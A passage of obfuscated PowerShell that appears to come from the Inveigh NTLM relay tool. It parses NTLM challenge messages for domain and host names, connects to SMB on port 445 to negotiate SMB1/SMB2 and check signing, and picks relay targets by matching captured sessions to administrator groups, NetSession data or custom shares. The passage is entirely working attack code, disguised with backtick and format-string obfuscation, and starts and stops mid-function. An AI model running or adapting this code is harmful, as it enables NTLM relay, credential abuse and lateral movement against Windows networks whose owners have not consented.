        if(${P`AylOAD_`Con`V`ERT`ed}.("{1}{2}{0}" -f'ing','Sub','Str').Invoke((${n`TlM_`iNdeX} + 16),8) -eq ("{1}{0}" -f '2000000','0'))
        {
            ${ntlM_C`H`All`e`NGe} = ${P`AyLoad_cOn`V`Er`TED}.("{1}{0}{2}"-f'i','SubStr','ng').Invoke((${nTl`M`_IndEx} + 48),16)
        }

        ${Target_nAMe`_`l`E`NGTH} = gEt-`UI`Nt16DAtAlEn`Gth ((${N`T`lm_In`dEX} + 24) / 2) ${p`Ay`LoaD}
        ${NEgO`T`IA`TE_`FlagS} =   (  gi VaRiAbLe:4vxN  ).vaLUe::("{0}{1}"-f'To','Int16').Invoke((${p`AyLoaD_`Co`NV`e`RteD}.("{0}{3}{2}{1}" -f 'SubS','ng','i','tr').Invoke((${nTL`M`_inDEx} + 44),2)),16)
        ${nEg`ot`iA`Te_FLaGs} =  (v`Ar`IABlE ("2k"+"Ra") -VaL  )::("{2}{0}{1}"-f 'tr','ing','ToS').Invoke(${nEGoTIAt`E`_f`la`GS},2)
        ${tA`Rg`ET_inf`O_`F`lAg} = ${NeGoTI`At`E_`F`LaGs}.("{2}{1}{0}"-f'ing','ubStr','S').Invoke(0,1)

        if(${t`ArgE`T_info_fl`AG} -eq 1)
        {
            ${t`ArgET_InFO_In`d`eX} = (${ntL`m`_`iNdEX} + 80) / 2
            ${Tar`geT_IN`FO`_`iND`ex} = ${T`ARgEt_I`N`FO`_in`dEX} + ${tA`RgEt`_NAMe`_LeNGTH} + 16
            ${tARge`T`_iNFo_`I`TEm`_TY`Pe} = ${pAy`LOAD}[${TaR`g`eT`_inFO_I`Ndex}]
            ${i} = 0

            while(${Targ`eT_`In`FO`_itEM_`TyPe} -ne 0 -and ${I} -lt 10)
            {
                ${tARgET_I`N`Fo_IteM`_`l`E`NGTh} = ge`T-Ui`Nt1`6D`AtALEngTh (${taRg`et_`INfo`_INdEx} + 2) ${pAyLO`Ad}

                switch(${Ta`R`GeT`_iNFO_ITEM`_tY`Pe}) 
                {

                    2
                    {
                        ${NEtBI`OS`_dO`maI`N_`NAmE} = C`OnV`E`R`T`-DaTAT`oStRINg (${tArgET`_I`N`F`o_INd`ex} + 4) ${ta`RgEt`_Info`_`itEm_lEngTH} ${p`A`yloaD}
                    }

                    3
                    {
                        ${D`N`s_`COmp`UTER_n`AMe} = CON`VErt-`d`AtA`T`oSTrIng (${TArgE`T`_INFO_I`Nd`ex} + 4) ${TaRget_iNf`o`_i`TeM_lEn`gTh} ${pAyL`oad}
                    }

                    4
                    {
                        ${DnS_`Do`Main`_nAMe} = conVer`T`-`dataT`Ostr`inG (${tArGEt_INfO`_`Ind`Ex} + 4) ${T`ARgEt_`inF`o`_ITe`M_LeNgTh} ${p`A`yload}
                    }

                }

                ${taRGeT_inFo`_`I`NDeX} = ${T`ARGE`T_INFo_i`N`D`ex} + ${taRG`E`T`_IN`FO`_i`TEM_LENg`TH} + 4
                ${tArget`_inFo`_iT`EM_t`Y`Pe} = ${P`AYl`oAD}[${T`Arget_Info_i`N`DEx}]
                ${i}++
            }

            if(${ne`Tb`IOs_dOMA`In`_NAMe} -and ${d`NS`_dO`mAiN_N`AMe} -and !${i`Nve`iGh}."dO`m`AiN_maPp`I`Ng_TabLE".${NET`B`I`oS_domai`N_na`mE} -and ${netBI`oS_doma`i`N_NAMe} -ne ${DNs_Dom`AIN_`N`A`mE})
            {
                ${INV`ei`gh}."doMAiN_MAppiN`g`_`TAB`LE".("{0}{1}"-f'A','dd').Invoke(${Net`BI`oS`_d`OMAIn_naMe},${d`Ns`_`DomA`IN_na`ME})
                ${INV`EIgH}."Ou`TpuT_qUe`UE"."a`dD"(("[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name ")) > ${NU`ll}
            }

            for(${i} = 0;${i} -lt ${iN`VeI`gh}."enU`m`ErAtE"."c`Ount";${i}++)
            {

                if(${INV`E`igH}."ENu`ME`RatE"[${I}]."i`P" -eq ${tA`RG`et} -and !${in`V`EIGh}."E`NuMEr`AtE"[${I}]."Hos`TNA`me")
                {
                    ${Inv`eIGH}."eNu`M`Erate"[${i}]."HOSTnA`Me" = ${dns_C`o`mp`Ut`Er_NAMe}
                    ${INve`IgH}."e`Nu`MERATe"[${i}]."DNS Domain" = ${DNs_`D`OmAI`N_NA`ME}
                    ${in`VEi`GH}."eNUME`R`ATe"[${I}]."netBIOS Domain" = ${NET`BIoS_dO`MAin`_NAmE}
                    break
                }

            }

        }

        return ${ntLM_ch`Al`lEN`GE}
    }

    function inV`OK`E-SMbcOn`Nect
    {
        param (${PrOce`ss`iD},${So`U`R`cEIp})

        function TeST`-Sm`BpOrt
        {
            param (${Tar`G`eT})
            
            try
            {     
                ${smB`_tA`RgeT_`T`eSt} = Ne`W-`OBJe`cT ("{0}{6}{2}{4}{5}{1}{3}"-f'Syste','ien','Soc','t','kets.','TCPCl','m.Net.')
                ${s`m`B_T`ArgET_`TeS`T_RE`sULt} = ${SMB_`Tar`get_t`E`sT}.("{1}{2}{0}"-f 'nect','Beg','inCon').Invoke(${ta`R`get},"445",${nU`LL},${n`UlL})
                ${S`m`B_pOrt`_tESt_Suc`CeSs} = ${s`mB`_T`ARG`et_`TeST`_rE`Sult}."asy`N`cwaiTh`AnDlE".("{2}{0}{1}" -f'n','e','WaitO').Invoke(100,${faL`SE})
                ${SM`B_`T`ARGEt_T`ESt}.("{1}{0}" -f 'e','Clos').Invoke()

                if(${sm`B_PORt`_T`Es`T_s`U`cCEsS})
                {
                    ${sm`B_SE`R`VER} = ${t`RUE}
                }
                else
                {
                    ${S`Mb_S`ERV`eR} = ${F`A`lSe}    
                }

                for(${I} = 0;${i} -lt ${InvE`I`gH}."En`UMERa`TE"."Co`UnT";${I}++)
                {

                    if(${InV`eIGh}."ENu`mE`RATE"[${i}]."i`P" -eq ${Ta`R`get})
                    {
                        ${taRGet`_`iNd`EX} = ${i}
                        break
                    }

                }

                if(${t`ARGE`T`_IND`eX} -and ${iN`Ve`IgH}."enU`mE`RA`Te"[${tArG`e`T_IND`Ex}]."i`P" -eq ${targ`et})
                {
                    ${I`N`VEIgh}."E`N`Umera`Te"[${TAr`g`E`T_`INDEX}]."SMB Server" = ${SmB_SE`R`V`er}
                    ${I`NveI`GH}."EnUME`R`ATE"[${t`A`RgeT_`INDEX}]."Targeted" = $(Ge`T`-dAtE -format ('s'))
                }
                else
                {
                    ${i`Nve`iGH}."enume`RA`TE".("{0}{1}"-f 'A','dd').Invoke((NE`W`-rElA`YE`NuMoBjeCt -IP ${ta`R`get} -SMBServer ${sM`B_`seRv`Er} -Targeted $(GeT-`DAte -format ('s')))) > ${NU`Ll}
                }

                return ${sMb_porT`_tES`T`_SucceSS}
            }
            catch 
            {
                return ${f`A`lSE}
            }

        }

        function INVoKE`-sm`B`Ne`gOT`iATE
        {
            param (${T`ARGET})

            ${Cli`Ent} = n`E`W-ObJe`Ct ("{4}{6}{0}{7}{2}{1}{3}{5}"-f'.','li','ckets.TCPC','en','Syste','t','m.Net','So')
            ${c`li`EnT}."Cl`iENT"."re`CeIVETIm`EOuT" = 60000
            ${clI`e`Nt}.("{0}{1}{2}" -f 'Conn','ec','t').Invoke(${t`ArGEt},"445")

            try
            {
                ${C`lIent_`S`TREAM} = ${cl`Ie`NT}.("{0}{1}{2}" -f 'G','et','Stream').Invoke()
                ${sTa`gE} = ("{0}{2}{1}{3}" -f 'Ne','otiateS','g','MB')
                ${clie`N`T`_re`ceIVe} = N`Ew-oBJe`cT ("{1}{2}{0}"-f'te[]','Sy','stem.By') 1024
            }
            catch
            {
                ${ERROR_`ME`SS`A`gE} = ${_}."EXCep`Ti`ON"."m`e`ssaGE"
                ${ERRoR_m`Ess`AGE} = ${ERrOR_`mE`s`s`AgE} -replace "`n",""
                ${I`Nve`IgH}."o`Utpu`T_qUE`Ue"."A`dD"(("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage ")) > ${Nu`LL}
                ${ST`AGe} = ("{1}{0}"-f 'it','Ex')
            }

            while(${s`T`AgE} -ne ("{1}{0}"-f 't','Exi'))
            {

                try
                {
                
                    switch (${StA`gE})
                    {

                        ("{3}{1}{0}{2}"-f'ateS','oti','MB','Neg')
                        {
                            ${P`AckET`_sm`B`_H`EaDEr} = nEw-PAckEts`MBH`EAd`ER 0x72 0x18 0x01,0x48 0xff,0xff ${P`Ro`cEssId} 0x00,0x00       
                            ${PaCK`Et`_S`mb_DatA} = NEW-PaCKEts`MB`N`eg`OtIA`TEPR`o`ToCoL`ReQuesT ${smb_v`erS`i`oN}
                            ${S`mb_HEa`d`eR} = COnVeRTfrOm-PACkeT`O`R`de`Re`ddIcTI`O`NarY ${paCk`e`T_sm`B_h`eADeR}
                            ${sM`B_D`Ata} = cOnVER`TfrOM`-PackE`TOrd`eR`e`dDiCt`iO`NaRY ${pAcK`eT_`sMB_`datA}
                            ${P`AcKeT_NetbIOs_SEs`siOn_s`e`RV`Ice} = nEw`-PAck`EtNetB`I`OSsESs`IO`NsERv`iCE ${s`mB`_h`eaDer}."l`eNgth" ${S`MB`_dATa}."LEn`gtH"
                            ${N`ET`BiOs_SeSSi`ON_seRVi`cE} = c`onveR`Tfr`O`M`-pAck`Et`orde`R`edDICtioN`Ary ${P`AC`kE`T_nEtBi`OS`_`SEsSion_S`eRVICE}
                            ${ClIen`T_Se`ND} = ${NE`T`Bi`os_SES`sIon_SE`R`Vice} + ${S`mb_hEA`deR} + ${sMB_`DA`Ta}
                            ${clIent`_St`ReAM}.("{1}{0}" -f 'te','Wri').Invoke(${clIEN`T`_SEND},0,${cL`ienT`_S`enD}."LeN`gtH") > ${n`ULl}
                            ${clIeN`T_s`T`Ream}.("{1}{0}"-f 'sh','Flu').Invoke()    
                            ${cliE`N`T`_str`eaM}.("{0}{1}"-f'Re','ad').Invoke(${C`L`Ient_`RECeI`Ve},0,${CLIE`Nt_`RECE`I`Ve}."LE`NgTh") > ${NU`ll}

                            if( $Xv8QNB::"tOS`T`RiNG"(${c`lient_`Re`CE`IVe}[4..7]) -eq ("{1}{2}{0}" -f'42','ff-53-','4d-'))
                            {
                                ${sm`B2} = ${fa`Lse}
                                ${inve`i`GH}."OuTP`UT_Qu`euE"."a`Dd"(("[!] [$(Get-Date -format s)] Negotiated SMB1 not supported ")) > ${nU`lL}
                                ${Inv`eigH}."OUT`Put_qu`e`UE"."A`DD"(("[*] [$(Get-Date -format s)] Trying anonther target ")) > ${Nu`ll}
                                ${c`l`IEnt}.("{1}{0}" -f 'e','Clos').Invoke()
                                ${s`T`AgE} = ("{1}{0}"-f 't','Exi')
                            }
                            else
                            {
                                ${s`mB2} = ${Tr`Ue}
                                ${STa`ge} = ("{2}{3}{0}{1}"-f 'eS','MB2','N','egotiat')
                            }

                            if(${tA`RG`eT} -and  ( GE`T-vAriA`B`lE  ("xv"+"8q"+"Nb")  ).vALuE::"ToStr`ING"(${CLIE`NT`_`RecEIvE}[70]) -eq '03')
                            {        
                                ${in`Ve`igH}."oU`TpuT`_qUEUe"."A`dd"(("[!] [$(Get-Date -format s)] Signing is required on $target ")) > ${n`UlL}
                                ${iNv`EiGh}."oU`TPUT_Q`U`eue"."a`dd"(("[*] [$(Get-Date -format s)] Trying another target ")) > ${NU`LL}
                                ${SIG`NING} = ${tR`UE}
                                ${C`L`iEnT}.("{1}{0}"-f'e','Clos').Invoke()
                                ${S`TA`GE} = ("{0}{1}" -f'Exi','t')
                            }
                            else
                            {
                                ${si`gn`iNG} = ${FA`l`SE}    
                            }

                        }
                        
                        ("{2}{3}{0}{1}" -f 'M','B2','Negoti','ateS')
                        { 
                            ${T`REe_ID} = 0x00,0x00,0x00,0x00
                            ${SE`S`siO`N_ID} = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                            ${me`SSa`g`E_Id} = 1
                            ${P`AckeT_sm`B2_`HEAdEr} = neW-P`A`Cket`SmB2h`eaDeR 0x00,0x00 0x00,0x00 ${fA`Lse} ${MeS`sA`GE_`id} ${prOC`E`Ssid} ${TR`eE`_ID} ${SeS`si`oN`_Id}  
                            ${p`A`C`keT_S`mB2_da`TA} = n`Ew-`PA`CK`ETsMB`2NEGO`TIAtEPROtoColrEQU`est
                            ${Sm`B2_H`eA`der} = COnv`ErtfROM`-`PA`c`KeT`orDer`edDIc`T`iOnarY ${p`Ack`e`T`_SMb2`_hEadER}
                            ${SMB`2_`DAta} = CoNveRtFrOM-p`ACkeTO`RDEREd`dIc`TI`o`NARy ${P`AckET`_SmB2_`DA`TA}
                            ${pAc`KeT_NEtBioS`_SEssI`O`N`_SErvI`cE} = NEW-pAckEtn`E`Tb`io`SsESSI`ONSERviCe ${Smb`2_`HE`ADER}."lEn`gtH" ${S`mb`2_data}."LeNg`Th"
                            ${neT`B`i`os_seSsIoN_S`ERvICe} = CoNv`ER`T`FRoM-`pAckEtOR`DEr`Ed`D`ICtIONARY ${p`ACk`ET`_NeTbI`oS`_SEs`SI`on_SerVIce}
                            ${cliEnt_s`E`ND} = ${NE`Tb`I`oS`_Ses`SioN_sErviCE} + ${S`mB`2`_hEAdeR} + ${s`Mb2`_DATa}
                            ${C`Li`EnT_ST`RE`AM}.("{1}{0}" -f 'rite','W').Invoke(${c`LIEnT`_`SEnd},0,${C`L`IEnT_SeNd}."LE`NGTh") > ${n`UlL}
                            ${C`lIeN`T_STr`E`Am}.("{1}{0}" -f'ush','Fl').Invoke()    
                            ${CLIE`NT`_`StRe`AM}.("{0}{1}"-f 'Rea','d').Invoke(${CLIeN`T`_Re`CEiVe},0,${C`LIEn`T_ReCEiVE}."LE`NGTh") > ${nU`LL}
                            ${sta`ge} = ("{0}{1}" -f'Exi','t')
                            ${I`NvE`IGh}."O`UTPut_`qu`EUE"."a`dd"(("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target ")) > ${nU`lL}
                        }
                    
                    }

                }
                catch
                {
                    ${er`R`oR_mEsSa`gE} = ${_}."exc`eP`TiON"."M`es`SaGE"
                    ${e`RR`OR_ME`ssAGE} = ${eRr`oR_`mE`s`SAge} -replace "`n",""
                    ${in`VeI`gH}."Ou`TP`Ut_Q`UeUE"."A`Dd"(("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage ")) > ${Nu`lL}
                    ${S`Ta`Ge} = ("{0}{1}" -f 'Exi','t')
                }
            
            }
            
            return ${C`LIEnT},${S`mB2},${sI`GnINg}
        }

        function T`eSt`-sMbt`ArgEt
        {
            param([Array]${t`ArgE`TS},[Int]${l`iM`IT},[String]${In`iT`IatoR})

            ${F`iL`TEr_DATe} = G`ET`-DATe

            for(${i} = 0;${I} -lt ${In`V`EIGh}."ENU`mE`RA`Te"."cou`NT";${I}++)
            {

                if(!${IN`V`eIGh}."ENuME`Ra`Te"[${I}]."I`P" -or ${in`Ve`IGH}."e`Num`EratE"[${I}]."i`P" -eq ${s`OurC`eip} -or ${INv`eI`gH}."En`Um`eR`ATe"[${i}]."S`IGN`InG" -or ${INVe`i`gh}."ENUm`er`Ate"[${I}]."SMB2.1" -eq ${fa`LSE} -or 
                (${I`NVeiGh}."EnUmeR`ATe"[${i}]."SMB Server" -eq ${fa`lsE} -and (n`E`W-TImE`SpAn ${i`Nv`EiGH}."E`NuMeR`ATe"[${I}]."tar`GeTED" ${fiLT`e`R_dAte})."mIn`UT`eS" -lt ${TArgE`Tr`efr`EsH}))
                {

                    if(${i`Nv`eIgh}."eNum`Er`Ate"[${I}]."i`P")
                    {
                        ${tArG`ET`s_e`xc`LUDEd} += @(${iN`V`EIgH}."e`NUMerATE"[${I}]."i`p")
                    }

                }

            }

            if(${TAr`Ge`TS} -and ${ta`RGeTs`_e`Xc`lud`ed})
            {
                ${T`A`RGETs} = C`oMp`Are-ob`jE`cT -ReferenceObject ${t`ArgETs} -DifferenceObject ${tA`R`getS_`E`XcludEd} -PassThru | WHE`Re-ob`JeCT {${_}."SI`deINDICaT`or" -eq "<="}
                ${SesSION`S`_tEmp} = ${iNv`Ei`gH}."ses`sIOn"
                
                if(${tA`R`GETS} -and ${IN`VeI`Gh}."relay`_`hi`S`Tory_T`AbLe".${so`URce`IP} -and
                (compA`Re`-O`BJECt -ReferenceObject ${Ta`R`GeTS} -DifferenceObject ${IN`V`EIgh}."R`e`lAY_h`i`S`Tory_taBle".${sOUr`c`EIP} | wh`eRE`-OBJ`ecT {${_}."si`deInd`i`cATor" -eq "<="}))
                {
                    [Array]${t`ARg`EtS} = co`mp`Are-ObJE`cT -ReferenceObject ${T`ARgEtS} -DifferenceObject ${InV`e`IGH}."R`eL`Ay_hIstORy`_`T`ABLE".${so`U`RCeiP} -PassThru | W`here-oBj`Ect {${_}."s`idE`IndIcatoR" -eq "<="}
                }
                elseif(${TARG`etS} -and (${Se`ssI`Ons_t`EMP} | Whe`Re`-obj`EcT {${_}."STaT`Us"}))
                {
                    ${TaRG`Ets_t`emP} = ${tA`RgetS}
                    ${T`ARg`ets} = @()
                    
                    foreach(${tARge`T`_enTRy} in ${TAr`gE`TS_T`emP})
                    {
                        
                        ${se`S`sions} = @(${sEsS`I`OnS_Temp} | WHerE-`obje`Ct {${_}."Ta`Rget" -eq ${tARGE`T_`en`T`Ry} -and ${_}."st`A`Tus" -eq ("{1}{0}"-f'cted','conne')})

                        if(${s`ess`iONS} -and ${S`ESsIO`Ns}."co`Unt" -lt ${l`imit})
                        {
                            ${tArGE`TS} += ${t`Ar`Get_enTrY}
                        }
                        elseif(${InItI`At`OR})
                        {
                            ${sESSi`o`Ns} = @(${S`Es`SiONs`_tE`Mp} | W`h`ERe-ObjE`cT {${_}."tar`gET" -eq ${TarG`Et_`eN`TrY} -and ${_}."iNIt`IaT`oR" -eq ${I`NITia`Tor} -and ${_}."S`Ta`Tus" -eq ("{0}{2}{1}" -f'co','ed','nnect')})

                            if(${sE`S`siOnS} -and ${seS`sioNs}."Cou`Nt" -lt ${lIM`It})
                            {
                                ${TARg`E`Ts} += ${Ta`Rg`eT`_eN`TrY}
                            }

                        }

                    }

                    if(!${TaR`G`EtS})
                    {

                        foreach(${taR`GET_`ENtRY} in ${TAr`g`ETS_tEmP})
                        {
                            ${s`Es`SiOns} = @(${SesSI`OnS_Te`MP} | w`hERe-ObJE`cT {${_}."t`ARGet" -eq ${TARgeT_`E`NT`RY} -and ${_}."stA`TUS" -eq ("{0}{3}{1}{2}" -f 'di','ecte','d','sconn')})

                            if(${se`SSi`oNS})
                            {
                                ${tar`Gets} += ${taRg`E`T_e`NtRY}
                            }

                        }

                    }
                        
                }
                
            }

            if(${Ta`R`gEtS} -and ${INv`EI`gh}."TAr`gEt_`lI`St")
            {
                ${taR`gets} = COM`PARE-OBjE`ct -ReferenceObject ${TA`R`gETs} -DifferenceObject ${IN`VEi`gH}."t`ARGEt_`LiSt" -ExcludeDifferent -IncludeEqual -PassThru
            }

            ${I} = 0
            ${Ra`NdOM_`Index_`H`isTO`Ry} = @()

            while(!${TA`RGeT} -and ${i} -lt ${T`AR`gEts}."cO`UNT")
            {
                ${I}++

                if(${TaRg`e`Ts}."c`oUnt" -eq 1)
                {
                    ${T`ARG`et} = ${tArG`ets}[0]
                }
                else
                {
                    ${rand`O`m`_`RAnge} = 0..(${T`ARgE`Ts}."cou`NT" - 1)
                    ${RaN`do`m_rA`NGE`_`FIlTEreD} = ${r`AND`om_RA`Nge} | wHEr`E-oBj`ECT {${RA`NDO`m_iN`deX`_hIsToRy} -notcontains ${_}}

                    if(${r`ANDo`M_R`A`N`GE_`FilTERED})
                    {
                        ${rAN`Dom_`INdEx} = GET-Ra`N`dOM -InputObject ${RAnDOm_rA`NG`e_fI`lt`EReD}
                        ${raNDo`M`_I`NdE`X`_historY} += ${raNd`Om_i`Nd`ex}
                        ${t`ARGET} = ${tArg`e`Ts}[${r`ANDom`_i`NDeX}]
                    }

                }

                if(${t`ArgEt} -eq ${soU`Rc`eiP})
                {
                    ${t`ARGet} = ${nu`lL}
                }

                if(${Ta`R`geT})
                {
                    ${sm`B_`POrt_tES`T_`SuCCESS} = tESt-`s`m`BpoRt ${tAr`g`et}

                    if(${S`mB_`port_TESt_`s`UCC`Ess})
                    {
                        ${sM`B_NE`gOti`A`TE} = Invo`ke-SMbn`E`G`OT`iaTE ${TA`Rget}
                        ${cL`IE`NT} = ${s`M`B_`NegOtiAtE}[0]
                        ${s`mB2} = ${SMB_nego`T`iA`Te}[1]
                        ${SI`Gni`Ng} = ${sM`B_neGot`iATe}[2]
                        ${S`m`B`_ServEr} = ${TR`UE}

                        for(${i} = 0;${I} -lt ${INve`I`Gh}."Enu`ME`Rate"."C`OUNt";${i}++)
                        {

                            if(${I`NVE`igh}."eNUmE`RA`TE"[${i}]."IP" -eq ${t`Ar`GEt})
                            {
                                ${TARge`T_`INDEx} = ${I}
                                break
                            }

                        }

                        ${I`NV`Eigh}."eN`UMer`A`TE"[${t`A`Rget_inDEX}]."SMB2.1" = ${s`MB2}
                        ${inv`EI`gh}."enumEra`TE"[${T`ArgEt_`inD`ex}]."sig`NI`Ng" = ${s`IGn`iNG}
                        ${i`Nve`IgH}."en`UmERa`Te"[${tA`RGET_i`N`DEX}]."SMB Server" = ${s`m`B_SE`RveR}
                        ${inv`Eigh}."E`Nu`meRaTE"[${TAr`g`E`T_iNDEx}]."Targeted" = $(g`E`T-DATe -format ('s'))

                        if(!${sM`B2} -and ${s`igNIng})
                        {
                            ${T`Ar`Get} = ${NU`ll}
                        }

                    }
                    else
                    {
                        ${TaRG`et} = ${N`ULL}    
                    }

                }
                
            }
            
            return ${c`liENT},${tARG`et}
        }

        if(${INVE`I`GH}."T`Arg`et_lIst"."cO`UnT" -gt 1 -or (!${I`NVeIGH}."tArg`Et_L`I`St" -and ${IN`VEi`gh}."EnUm`Er`Ate"))
        {
            ${IN`Vei`gh}."o`UTPUt_Q`UE`Ue"."A`DD"(("[!] [$(Get-Date -format s)] Searching for a target ")) > ${n`ULl}
        }

        try
        {
            ${Ta`R`gets} = ${Nu`lL}
            ${T`ArGEt} = ${Nu`Ll}

            for(${I} = 0;${I} -lt ${iNVEi`gh}."enUM`e`RaTe"."C`ounT";${i}++)
            {

                if(${In`Ve`IGh}."eNu`Me`RaTe"[${I}]."i`p" -eq ${So`Urc`eIP} -and ${i`N`VeIGh}."ENu`mERaTe"[${i}]."SESsi`o`NS")
                {
                    [Array]${iniTi`A`TOr_`s`E`sSioNS} = ${iNV`ei`GH}."ENU`mERAte"[${i}]."S`esSIo`Ns"
                    break
                }

            }

            ${INI`TI`At`Or_sesS`IoNs} = ${IN`ITiat`o`R`_sES`sI`ons} | so`R`T-obJect {g`ET-RA`NDoM}
            
            
            if(${I`NI`Ti`AtOr_SES`sIo`NS})
            {
                
                foreach(${SE`ssi`ON} in ${iN`itIat`or_S`e`SSioNS})
                {

                    for(${I} = 0;${i} -lt ${InV`EiGH}."EnUMERa`TE"."co`UNt";${i}++)
                    {

                        if(${I`N`VeiGh}."e`NUmer`AtE"[${i}]."Administrator Users" -contains ${SEsS`ioN} -and ${IN`VE`igH}."eNu`m`ERaTE"[${i}]."ip")
                        {
                            ${Ta`R`GetS} += @(${In`VeiGH}."e`Num`Er`AtE"[${i}]."IP")
                        }

                    }

                    if(${TARge`Ts})
                    {
                        ${i`NVeigh}."Out`P`Ut_Q`UEUe"."a`dD"(("[!] [$(Get-Date -format s)] Administrator group match found for session $session on: ")) > ${NU`LL}
                        ${iNV`E`IgH}."O`UTp`U`T_qUeUe".("{1}{0}"-f 'dd','A').Invoke((${ta`R`Gets} -join ",")) > ${N`Ull}
                        ${sM`B_tArg`et_REs`U`ltS} = &("{4}{2}{0}{1}{3}"-f'-S','MBTa','est','rget','T') ${T`ArgE`Ts} ${se`SsI`OnlIm`Itp`RIv}
                        ${c`l`ienT} = ${sMb_Ta`RGe`T`_reS`U`LTS}[0]
                        ${T`ARGEt} = ${Smb_T`ArgET`_`R`ESULtS}[1]
                    }

                }

            }

            
            if(${INitiaTO`R_s`ess`I`ONS} -and !${ta`Rg`ETs} -and !${t`ArG`Et})
            {

                function gE`T-s`eSS`iON`grOUp
                {
                    param(${SE`S`sioN})

                    ${gROU`P`_`LiSt} = @()
                    ${gRoU`P`_tabLe_`kEyS`_teMP} = ${In`VE`Igh}."GR`Oup`_Ta`BLE"."K`eyS"

                    foreach(${G`RO`Up} in ${Gr`OuP`_t`AbLE_keY`S_T`EmP})
                    {

                        if(${I`NvEIGH}."gROup`_`Tab`lE".${GRo`UP} -contains ${Ses`sI`oN})
                        {
                            ${gROu`p`_lIst} += ${Gr`ouP}
                        }

                    }

                    for(${i}=0;${i} -lt ${gR`Ou`p_lI`st}."coU`NT";${I}++)
                    {
                        
                        foreach(${GrO`Up} in ${GR`oU`P_t`AblE_kEYs_temp})
                        {

                            if(${InV`e`Igh}."gR`oUP_`TAB`Le".${Gr`ouP} -contains ${gr`oUp`_Li`sT}[${i}])
                            {
                                ${GrOup`_`lIst} += ${Gr`oUP}
                            }

                        }

                    }

                    return ${GRo`Up_`lIST}
                }

                ${seSsiO`N_`G`ROupS} = @()
                ${taR`GEts} = @()

                foreach(${S`e`sSioN} in ${inI`TIAtOr`_S`essi`ONs})
                {
                    ${sES`sIo`N_G`ROuPs} += &("{4}{2}{1}{5}{3}{0}" -f 'up','io','Sess','o','Get-','nGr') ${sE`SSi`ON}
                }

                if(${SE`ssI`On_g`ROUps})
                {

                    foreach(${grO`UP} in ${sES`S`I`on`_GROuPs})
                    {

                        for(${I} = 0;${i} -lt ${iN`VE`Igh}."eNUME`R`ATe"."COu`Nt";${I}++)
                        {

                            if(${INVE`i`GH}."eNUMEr`AtE"[${i}]."Administrator Groups" -contains ${Gro`Up} -and ${i`Nve`igh}."e`NU`MEraTe"[${i}]."iP")
                            {
                                ${T`AR`GeTS} += @(${I`N`VEIGH}."ENumEr`A`TE"[${i}]."i`p")
                            }

                        }

                        if(${Tar`Ge`Ts})
                        {
                            ${inVE`igh}."o`U`Tput_QUe`UE"."A`dd"(("[!] [$(Get-Date -format s)] Administrator group nested match found for $group from session $session on: ")) > ${nu`LL}
                            ${I`Nve`IgH}."o`UTpU`T_`QUeUE".("{0}{1}" -f'Ad','d').Invoke((${t`AR`GEtS} -join ",")) > ${n`Ull}
                            ${S`M`B_`TA`RGEt_ResULTS} = &("{4}{3}{0}{2}{1}" -f 's','get','t-SMBTar','e','T') ${t`ARg`etS} ${SEsS`io`NLiM`ItPRIv}
                            ${CLIE`NT} = ${Sm`B_Tar`G`ET_`R`esultS}[0]
                            ${Ta`RGet} = ${sM`B_`TA`RGeT`_rEsuL`TS}[1]
                        }

                    }

                }

            }

            
            if(!${tA`R`gETs} -and !${T`A`RGeT} -and ${s`oURC`Eip})
            {

                for(${i} = 0;${i} -lt ${In`VeiGH}."en`U`meRaTe"."c`OUnT";${i}++)
                {

                    if(${iN`VE`iGH}."ENUm`er`ATe"[${i}]."NeTSE`sSi`ON" -contains ${So`UR`cE`IP})
                    {
                        ${T`Arge`TS} += @(${i`NVe`Igh}."ENuM`era`Te"[${I}]."ip")
                    }

                }

                if(${Ta`RGE`Ts})
                {
                    ${INv`EIGh}."OuT`P`Ut_queue"."A`dD"(("[!] [$(Get-Date -format s)] NetSession IP match found for $SourceIP on: ")) > ${n`ULL}
                    ${I`NveiGH}."o`UT`pUT_QuEUE".("{1}{0}" -f 'dd','A').Invoke((${taR`Ge`Ts} -join ",")) > ${nu`lL}
                    ${s`mB_Tar`GE`T_RESu`LTs} = &("{2}{1}{0}{3}" -f'BTarg','-SM','Test','et') ${TA`R`gEtS} ${se`SSio`N`LIMiTUN`priv}
                    ${c`lIENt} = ${SMB_TAr`g`et`_`ReS`ULTS}[0]
                    ${t`ArG`et} = ${S`M`B_`T`A`RgeT_rEsU`lTS}[1]
                }

            }

            
            if(!${TaR`GeTS} -and !${tA`R`gEt})
            {

                for(${i} = 0;${i} -lt ${In`VeI`gH}."ENu`ME`RaTe"."c`oUNT";${i}++)
                {

                    if(${I`NVE`Igh}."eNumEr`A`TE"[${I}]."sHar`ES")
                    {
                        ${t`A`RgetS} += @(${InV`e`Igh}."En`U`mErAte"[${I}]."iP")
                    }

                }
                                
                if(${TaRG`e`TS})
                {
                    ${I`NVei`Gh}."O`UTP`Ut`_qUeUE"."A`DD"(("[!] [$(Get-Date -format s)] Searching within the following list of systems hosting custom shares: ")) > ${n`ULL}
                    ${In`V`Eigh}."O`UTPUT_`qUe`UE".("{1}{0}"-f 'd','Ad').Invoke((${T`Ar`geTs} -join ",")) > ${nu`Ll}
                    ${sMb_taRge`T_`REsUl`TS} = &("{2}{0}{1}"-f'-SM','BTarget','Test') ${T`ARGE`TS} ${s`E`sSIonLIMITs`hAre} ${SoU`Rc`Eip}
                    ${C`li`EnT} = ${smb_tA`RgE`T_r`eS`UL`TS}[0]
                    ${tA`R`gEt} = ${sMB_T`Ar`get_`REsUlts}[1]
                }

            }

            
            if(!${t`Arget} -and ${T`A`Rge`TMOdE} -eq ("{0}{1}" -f'Rando','m'))
            {

                if(${iN`Vei`gH}."tArget`_`LIST"."C`OUnt" -gt 1)
                {
                    ${in`VeIGH}."Ou`T`Pu`T_queue"."a`DD"(("[!] [$(Get-Date -format s)] Selecting a random target ")) > ${n`ULL}
                }

                if(${I`NveI`GH}."t`ArGEt_`L`Ist")
                {
                    ${S`Mb_`Targ`Et_`Re`sULTs} = &("{2}{3}{1}{0}{4}" -f'BTarg','M','Tes','t-S','et') ${in`V`EIGh}."tArGet_`L`iST" ${SE`SSIONliMiTuNP`R`Iv}
                }
                else
                {
                    ${tARG`e`Ts} = @()
